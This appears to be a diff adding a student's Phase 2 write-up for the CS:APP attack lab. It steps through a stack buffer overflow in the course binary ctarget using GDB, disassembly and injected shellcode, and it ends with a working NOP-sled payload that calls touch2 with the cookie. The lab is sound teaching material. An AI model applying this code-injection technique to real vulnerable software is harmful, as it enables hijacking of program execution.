@@ -203,3 +203,195 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:1:73 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 65 C0 17 40
 [Inferior 1 (process 3574) exited normally]
 ```
+
+## Phase 2 (`ctarget`)
+
+```asm
+00000000004017ec <touch2>:
+  4017ec:	48 83 ec 08          	sub    $0x8,%rsp                    # 🎯 [TARGET]
+  4017f0:	89 fa                	mov    %edi,%edx
+  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)
+  4017f9:	00 00 00
+  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi
+  401802:	75 20                	jne    401824 <touch2+0x38>
+  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
+  401809:	bf 01 00 00 00       	mov    $0x1,%edi
+  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
+  401813:	e8 d8 f5 ff ff       	call   400df0 <__printf_chk@plt>
+  401818:	bf 02 00 00 00       	mov    $0x2,%edi
+  40181d:	e8 6b 04 00 00       	call   401c8d <validate>
+  401822:	eb 1e                	jmp    401842 <touch2+0x56>
+  401824:	be 10 31 40 00       	mov    $0x403110,%esi
+  401829:	bf 01 00 00 00       	mov    $0x1,%edi
+  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
+  401833:	e8 b8 f5 ff ff       	call   400df0 <__printf_chk@plt>
+  401838:	bf 02 00 00 00       	mov    $0x2,%edi
+  40183d:	e8 0d 05 00 00       	call   401d4f <fail>
+  401842:	bf 00 00 00 00       	mov    $0x0,%edi
+  401847:	e8 f4 f5 ff ff       	call   400e40 <exit@plt>
+```
+
+The phase 1 exploit can be adjusted to target the `touch2` function instead
+
+- `73 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 65 ec 17 40`
+
+However, we now need to also inject code to set the first argument (`rdi`) passed to `touch2`, to the value of `cookie`.
+
+Simply changing the return address results in
+
+```shell
+🐳 ❯ ./ctarget -qi exploit.phase2.bin
+Cookie: 0x59b997fa
+Misfire: You called touch2(0x32b852a0)
+FAIL: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:FAIL:0xffffffff:ctarget:2:73 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 65 EC 17 40
+```
+
+From disassembly can see `cookie` is at address `0x6044e4`
+
+```asm
+  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
+```
+
+To test this whilst stepping through with `GDB` can set the value of `rdi` to `cookie` before executing the `cmp` instruction
+
+```shell
+🐳 ❯ gdb ctarget
+(gdb) break touch2
+(gdb) run -q < exploit.phase2.bin
+Starting program: /csapp/labs/attacklab/ctarget -q < exploit.phase2.bin
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Cookie: 0x59b997fa
+
+Breakpoint 1, touch2 (val=4158666976) at visible.c:40
+(gdb) set $rdi = *0x6044e4
+(gdb) continue
+Continuing.
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:73 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 65 EC 17 40
+[Inferior 1 (process 479) exited normally]
+```
+
+Need to set return address from `getbuf` to address of exploit that sets `rdi` to `cookie` and then returns to `touch2`
+
+```asm
+movl (0x6044e4), %edi
+push 0x4017ec
+ret
+nop
+```
+
+To generate the byte codes for these instructions, assemble and disassemble the exploit code
+
+```shell
+🐳 ❯ gcc -c phase2.code.s
+🐳 ❯ objdump -d phase2.code.o > phase2.code.disassembly.asm
+```
+
+```asm
+0000000000000000 <.text>:
+   0:	8b 3c 25 e4 44 60 00 	mov    0x6044e4,%edi
+   7:	ff 34 25 ec 17 40 00 	push   0x4017ec
+   e:	c3                   	ret
+   f:	90                   	nop
+```
+
+Should be able to change exploit to make return address point to instructions on the stack, padded with `nop` instructions
+
+- `0x5561dc78` is `rsp` when filling the buffer
+
+- [nop sled] [movl] [push] [ret] [address of nop sled]
+- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [00 60 44 e4 25 3c 8b] [00 40 17 ec 25 34 ff] [c3] [78 dc 61 55]`
+
+```shell
+(gdb) x/12gx $rsp
+0x5561dc78:     0x9090909090909090      0x9090909090909090
+0x5561dc88:     0x9090909090909090      0x008b3c25e4446000
+0x5561dc98:     0x78c3ff3425ec1740      0x00000000005561dc
+0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
+0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
+0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+```
+
+Looks like the return address hasn't been aligned properly, need an extra `nop`?
+
+```shell
+(gdb) x/12gx $rsp
+0x5561dc78:     0x9090909090909090      0x9090909090909090
+0x5561dc88:     0x9090909090909090      0x8b3c25e444600090
+0x5561dc98:     0xc3ff3425ec174000      0x000000005561dc78
+0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
+0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
+0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+```
+
+...looks better?
+
+Yep that worked, `rip` was set to `0x5561dc78`, however, looks like the instructions have been sent in the wrong endianess
+
+```shell
+(gdb) x/19xb $rip
+0x5561dc91:     0x00    0x60    0x44    0xe4    0x25    0x3c    0x8b    0x00
+0x5561dc99:     0x40    0x17    0xec    0x25    0x34    0xff    0xc3    0x78
+0x5561dca1:     0xdc    0x61    0x55
+```
+
+First instruction after nop sled showing as
+
+```asm
+0x5561dc91  add %ah,0x44(%rax)
+```
+
+Need to fix the way the instructions are ordered...
+
+- `[00 60 44 e4 25 3c 8b] [00 40 17 ec 25 34 ff] [c3] [78 dc 61 55]`
+- `[8b 3c 25 e4 44 60 00] [ff 34 25 ec 17 40 00] [c3] [78 dc 61 55]`
+
+This failed with a segfault... try with `pushq` to see if its alignment issue
+
+```asm
+0000000000000000 <.text>:
+   0:	48 8b 3c 25 e4 44 60 	mov    0x6044e4,%rdi
+   7:	00
+   8:	ff 34 25 ec 17 40 00 	push   0x4017ec
+   f:	c3                   	ret
+```
+
+- [nop sled] [movq] [padding] [pushq] [ret] [address of nop sled]
+- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [48 8b 3c 25 e4 44 60] [00] [ff 34 25 ec 17 40 00] [c3] [78 dc 61 55]`
+
+Oh was probably not pushing an immediate value onto the stack, need to prefix with `$`
+
+```asm
+0000000000000000 <.text>:
+   0:	48 8b 3c 25 e4 44 60 	mov    0x6044e4,%rdi
+   7:	00
+   8:	68 ec 17 40 00       	push   $0x4017ec
+   d:	c3                   	ret
+```
+
+- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [48 8b 3c 25 e4 44 60] [00] [68 ec 17 40 00] [c3] [78 dc 61 55]`
+- The push bytes have shrunk so might need to fix nop sled....
+- Yep, requires 2 more bytes of padding now
+- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [48 8b 3c 25 e4 44 60] [00] [68 ec 17 40 00] [c3] [78 dc 61 55]`
+
+```shell
+🐳 ❯ ./ctarget -qi phase2.exploit.bin
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 48 8B 3C 25 E4 44 60 00 68 EC 17 40 00 C3 78 DC 61 55
+```
